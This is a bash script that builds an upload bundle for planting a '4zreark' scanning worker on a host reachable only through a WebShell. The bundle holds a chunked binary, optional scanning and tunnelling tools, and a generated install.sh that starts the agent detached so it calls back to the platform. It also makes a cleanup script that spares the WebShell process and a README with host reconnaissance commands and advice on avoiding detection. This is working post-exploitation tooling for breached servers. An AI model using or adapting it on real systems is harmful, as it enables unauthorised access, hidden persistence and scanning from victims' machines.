#!/usr/bin/env bash
# 生成「通过 WebShell 落地 4zreark worker」的自包含安装包。
#
# 为什么需要它：平台自带的节点部署只有两条路——SSH 一键部署、gost 反连——
# 两条都要求目标机有 sshd 或可被 Master 入站连到。WebShell 主机通常两者都没有，
# 只剩「上传文件 + 单条命令执行」。本脚本把 worker 切成可分批上传的分片，
# 并生成一个在目标机上照着跑就能起来的 install.sh。
#
# 用法：
#   ./webshell-node-bundle.sh --platform https://zre.example.com --token <节点密钥> \
#       --name web-01 [--caps subdomain,fingerprint] [--binary /path/to/worker] \
#       [--proxy socks5://relay:1080] [--out ./bundle-web-01] [--chunk 6] \
#       [--with-tools]
#
# 不给 --binary 时用 仓库根现场编译（linux/amd64 静态二进制）。
# --with-tools 把平台托管工具（data/tools/linux/ 下的 gogo/spray/
# katana/rem，由 toolruntime 维护）打成 tools/<name>.gz.part* 分片随包携带；
# 不加该参数时，worker 上线后也会通过节点网关按清单自动同步，只是首次任务前
# 需要等一个心跳周期。
set -euo pipefail

PLATFORM=""
TOKEN=""
NAME=""
CAPS="subdomain,fingerprint"
BINARY=""
OUT=""
CHUNK_MB=6
MAX_TASKS=5
PROXY=""
WITH_TOOLS="${WITH_TOOLS:-0}"

usage() { sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

while [ $# -gt 0 ]; do
  case "$1" in
    --platform) PLATFORM="${2:-}"; shift 2 ;;
    --token)    TOKEN="${2:-}"; shift 2 ;;
    --name)     NAME="${2:-}"; shift 2 ;;
    --caps)     CAPS="${2:-}"; shift 2 ;;
    --binary)   BINARY="${2:-}"; shift 2 ;;
    --out)      OUT="${2:-}"; shift 2 ;;
    --chunk)    CHUNK_MB="${2:-}"; shift 2 ;;
    --max-tasks) MAX_TASKS="${2:-}"; shift 2 ;;
    --proxy)    PROXY="${2:-}"; shift 2 ;;
    --with-tools) WITH_TOOLS=1; shift ;;
    -h|--help)  usage ;;
    *) echo "未知参数: $1" >&2; usage ;;
  esac
done

[ -n "$PLATFORM" ] || { echo "--platform 必填（worker 主动连这个地址）" >&2; exit 1; }
[ -n "$TOKEN" ]    || { echo "--token 必填（平台节点页『添加节点』只显示一次）" >&2; exit 1; }
[ -n "$NAME" ]     || NAME="web-$(date +%m%d%H%M)"
PLATFORM="${PLATFORM%/}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BACKEND="$ROOT"
OUT="${OUT:-$PWD/bundle-$NAME}"

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

if [ -z "$BINARY" ]; then
  echo "[1/5] 编译 linux/amd64 静态 worker"
  ( cd "$BACKEND" && PATH="${HOME}/.local/bin:${HOME}/go/bin:${PATH}" \
      CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
      go build -trimpath -ldflags="-s -w" -o "$WORK/worker" . )
  BINARY="$WORK/worker"
fi
[ -f "$BINARY" ] || { echo "二进制不存在: $BINARY" >&2; exit 1; }

echo "[2/5] 压缩并分片（每片 ${CHUNK_MB}MB）"
mkdir -p "$OUT"
rm -f "$OUT"/worker.gz.part* "$OUT"/worker.sha256
gzip -9 -c "$BINARY" > "$WORK/worker.gz"
( cd "$WORK" && split -b "${CHUNK_MB}m" -d -a 3 worker.gz "$OUT/worker.gz.part" )
GZ_SHA="$(sha256sum "$WORK/worker.gz" | awk '{print $1}')"
BIN_SHA="$(sha256sum "$BINARY" | awk '{print $1}')"
RAW_SHA="$BIN_SHA"
printf '%s  worker.gz\n' "$GZ_SHA" > "$OUT/worker.sha256"

# --with-tools：把托管工具打进包（tools/<name>.gz.part* + sha256 + 清单）
TOOL_NAMES=""
if [ "$WITH_TOOLS" = "1" ]; then
  TOOLS_DIR="$BACKEND/data/tools/linux"
  if [ -d "$TOOLS_DIR" ]; then
    mkdir -p "$OUT/tools"
    for t in gogo spray katana rem; do
      [ -f "$TOOLS_DIR/$t" ] || continue
      gzip -9 -c "$TOOLS_DIR/$t" > "$WORK/$t.gz"
      ( cd "$WORK" && split -b "${CHUNK_MB}m" -d -a 3 "$t.gz" "$OUT/tools/$t.gz.part" )
      printf '%s  %s.gz\n' "$(sha256sum "$WORK/$t.gz" | awk '{print $1}')" "$t" > "$OUT/tools/$t.sha256"
      TOOL_NAMES="$TOOL_NAMES $t"
    done
  fi
  [ -n "$TOOL_NAMES" ] || echo "[with-tools] 平台托管目录没有工具（先在平台上装好 gogo/spray/katana/rem）"
fi

echo "[3/5] 生成 install.sh / cleanup.sh"
YAML_CAPS="[$(printf '%s' "$CAPS" | awk -F, '{for(i=1;i<=NF;i++){printf "%s\"%s\"", (i>1?", ":""), $i}}')]"
PROXY_LINE=""
[ -n "$PROXY" ] && PROXY_LINE="  proxy: \"$PROXY\""

cat > "$OUT/install.sh" <<EOF
#!/bin/sh
# 4zreark worker 安装脚本（WebShell 通道专用，装完请删除本文件）
# 用法：cd 到本目录后 sh install.sh
#      DRY_RUN=1 sh install.sh   只校验与写配置，不启动进程
set -e
DIR="\$(cd "\$(dirname "\$0")" && pwd)"
cd "\$DIR"

PLATFORM="$PLATFORM"
TOKEN="$TOKEN"
NAME="$NAME"
EXPECT_SHA="$RAW_SHA"

if ! command -v gzip >/dev/null 2>&1; then
  echo "FAIL: 目标机没有 gzip"; exit 1
fi
if ls worker.gz.part* >/dev/null 2>&1; then
  cat worker.gz.part* > worker.gz
fi

if command -v sha256sum >/dev/null 2>&1; then
  GOT=\$(sha256sum worker.gz | awk '{print \$1}')
elif command -v openssl >/dev/null 2>&1; then
  GOT=\$(openssl dgst -sha256 worker.gz | awk '{print \$NF}')
else
  GOT=""
  echo "WARN: 没有 sha256sum/openssl，跳过分片校验"
fi
if [ -n "\$GOT" ] && [ "\$GOT" != "$GZ_SHA" ]; then
  echo "FAIL: worker.gz 校验不通过（got \$GOT）——分片缺失或被截断"
  exit 1
fi

gzip -dc worker.gz > worker.tmp
if command -v sha256sum >/dev/null 2>&1; then
  GOT2=\$(sha256sum worker.tmp | awk '{print \$1}')
  if [ "\$GOT2" != "\$EXPECT_SHA" ]; then
    echo "FAIL: 解压后二进制校验不通过（got \$GOT2）"; exit 1
  fi
fi
mv worker.tmp worker
chmod 755 worker

# 可选：恢复随包携带的扫描工具（--with-tools 打包）到 tools/linux/
if ls tools/*.sha256 >/dev/null 2>&1; then
  mkdir -p tools/linux
  for sumf in tools/*.sha256; do
    tname="\$(basename "\$sumf" .sha256)"
    if ls "tools/\$tname".gz.part* >/dev/null 2>&1; then
      cat "tools/\$tname".gz.part* > "tools/\$tname.gz"
      gzip -dc "tools/\$tname.gz" > "tools/linux/\$tname"
      chmod 755 "tools/linux/\$tname"
      rm -f "tools/\$tname.gz"
      echo "tool ok: \$tname"
    fi
  done
fi

mkdir -p config
umask 077
cat > config/config.yaml <<CFG
node:
  role: worker
  platform_url: "\$PLATFORM"
  token: "\$TOKEN"
  name: "\$NAME"
  max_tasks: $MAX_TASKS
  heartbeat_interval: 30
$PROXY_LINE
  capabilities: $YAML_CAPS
CFG
chmod 600 config/config.yaml

if [ "\${DRY_RUN:-0}" = "1" ]; then
  echo "DRY_RUN: 文件已就位，未启动"
  ls -l worker config/config.yaml
  exit 0
fi

rm -f worker.pid
if command -v setsid >/dev/null 2>&1; then
  setsid ./worker >> worker.log 2>&1 < /dev/null &
else
  nohup ./worker >> worker.log 2>&1 < /dev/null &
fi
echo \$! > worker.pid
sleep 2
if kill -0 "\$(cat worker.pid)" 2>/dev/null; then
  echo "WORKER_STARTED pid=\$(cat worker.pid)"
  echo "平台侧检查：节点 $NAME 应显示在线；否则看 worker.log"
else
  echo "WORKER_FAILED"
  tail -n 40 worker.log 2>/dev/null || true
  exit 1
fi
EOF
chmod 755 "$OUT/install.sh"

cat > "$OUT/cleanup.sh" <<'EOF'
#!/bin/sh
# 清理 worker：停进程（含子进程组）、删二进制与配置。节点密钥另在平台「吊销」。
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

# 先按 pid 杀整个进程组：install.sh 用 setsid 启动，pid 即组长。
if [ -f worker.pid ]; then
  PID="$(cat worker.pid)"
  kill -TERM -"$PID" 2>/dev/null || kill -TERM "$PID" 2>/dev/null || true
  sleep 1
  kill -KILL -"$PID" 2>/dev/null || kill -KILL "$PID" 2>/dev/null || true
fi

# 兜底：pid 文件丢失时按 /proc/<pid>/exe 反查。
# 不用 pkill -f "$DIR/worker"——它会把命令行里带这个字符串的 shell（含 WebShell 自身）一起杀掉。
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  [ "$p" = "$$" ] && continue
  exe="$(readlink -f "/proc/$p/exe" 2>/dev/null)" || continue
  case "$exe" in
    "$DIR/worker"|"$DIR/worker (deleted)") kill -KILL "$p" 2>/dev/null || true ;;
  esac
done

rm -f worker worker.gz worker.gz.part* worker.sha256 worker.pid worker.log worker.tmp
rm -rf config
echo "CLEANED: $DIR 已清理（平台侧记得吊销节点密钥）"
EOF
chmod 755 "$OUT/cleanup.sh"

cat > "$OUT/README.txt" <<EOF
4zreark worker · WebShell 落地包
节点名: $NAME
平台地址: $PLATFORM
能力: $CAPS
二进制 sha256: $RAW_SHA

步骤
1. 平台节点页「添加节点」→ 保存一次性密钥（本包里的 token 已写死）。
2. 在目标机确认可执行目录与出网（建议命令）：
   uname -m; id; df -h /tmp; mount | grep -E "noexec" || true
   curl -sS -m 5 -o /dev/null -w "%{http_code}\n" $PLATFORM/health
   （不是 200 就先解决出网/证书/代理，再装 worker）
3. 把 worker.gz.part* 全部上传到目标目录（WebShell 文件管理或 session_upload）。
4. sh install.sh        # 起进程并打印 WORKER_STARTED / 失败日志
   DRY_RUN=1 sh install.sh   # 只校验，不启动
5. 平台节点页看到该节点在线 → 建一个只读任务（子域/指纹）验证。
6. 收工：sh cleanup.sh，然后平台吊销节点密钥。

注意
- 不要把 worker 放进 Web 根目录（会被静态托管/被扫到）。
- 目标机需要可执行挂载点：/tmp 常被 noexec，优先应用目录或 /var/tmp。
- 任务里不要选「字典」（SubdomainDictID/DirDictID）：worker 不连库，选字典会直接失败。
- 扫描工具（gogo/spray/katana/rem）worker 上线后会经节点网关按清单自动同步；
  打包时加 --with-tools 可随包携带，装完即可跑全量模块。
  同步完成前：port_scan 有原生 TCP 兜底，dir_scan/crawler/vuln_scan 会因缺二进制失败。
EOF

echo "[4/5] 分片数: $(ls "$OUT"/worker.gz.part* | wc -l)，压缩后 $(du -h "$WORK/worker.gz" | awk '{print $1}')（原始 $(du -h "$BINARY" | awk '{print $1}')）"
echo "[5/5] 输出目录: $OUT"
ls -lh "$OUT"
